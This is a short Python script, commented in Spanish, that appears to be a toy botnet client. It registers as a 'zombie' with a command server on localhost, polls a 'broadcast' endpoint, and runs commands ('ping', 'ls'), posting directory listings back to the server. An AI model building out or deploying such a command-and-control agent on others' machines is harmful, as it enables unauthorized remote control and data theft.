"""
    Librerias adicionales:

        - ninguna

    Flujo del programa

    - Verificar si hay un archivo de configuración
        - si no: Comunicarse al servidor para obtener uno
        - si si: Cargar configuración

    - bucle:
        - Leer el broadcast del server para ver si hay comandos que ejecutar
            - Si si: Ejecutar comando
                - Enviar resultados del comando
        - Esperar 30 segundos
        - Repetir ciclo
"""

import os
import sys
import time

import requests

CONFIG = {
    'config_file': 'cfg.ini',
    'server_host': '127.0.0.1',
    'server_port': '80',
    'interval': 5,
    'id': None
}

last_executed_command = ''

def save_config():
    with open(CONFIG['config_file'], 'w') as f:
        for var, val in CONFIG.items():
            f.write('%s=%s\r\n' % (var, val))

        f.close()

def load_config():
    with open(CONFIG['config_file'], 'r') as f:
        for line in f.readlines():
            try:
                var, val = line.split('=')
                CONFIG[var] = val.rstrip()

            except Exception as e:
                pass

def compose_request(path):
    return "http://%s:%s/%s" %(CONFIG['server_host'], CONFIG['server_port'], path)

def push_command_result(cmd, result):

    form_data = {
        'node_id': CONFIG['id'],
        'result': result,
        'command': cmd
    }

    requests.post(compose_request('push_output'), data=form_data)

def execute_command(cmd):
    global last_executed_command

    if cmd == last_executed_command:
        return

    last_executed_command = cmd

    if cmd == "ping":
        print(" > Haciendo ping al servidor...")
        push_command_result(cmd, "Hola soy %s" % CONFIG['id'])

    elif cmd == "ls":
        print(" > Listando archivos...")

        lista = str(os.listdir('.'))
        push_command_result(cmd, lista)

    else:
        print(" > Comando desconocido...")

if not os.path.isfile(CONFIG['config_file']):
    connected = False

    while not connected:
        try:
            response = requests.get(compose_request('add_zombie'))
            CONFIG['id'] = response.text

            save_config()

            connected = True

        except:
            print(" > No se pudo comunicar con el servidor, reintentando...")
            time.sleep(CONFIG['interval'])

else:
    load_config()

print(" > Conectado con exito: %s" % CONFIG['id'])

try:
    while True:
        print(" > Reading broadcast...")

        try:
            response = requests.get(compose_request('broadcast'))
            command = response.text

            print(" > Comando recibido --> %s" % command)

            execute_command(command)

        except ConnectionError:
            pass

        time.sleep(int(CONFIG['interval']))

except KeyboardInterrupt:
    print(" > Saliendo")
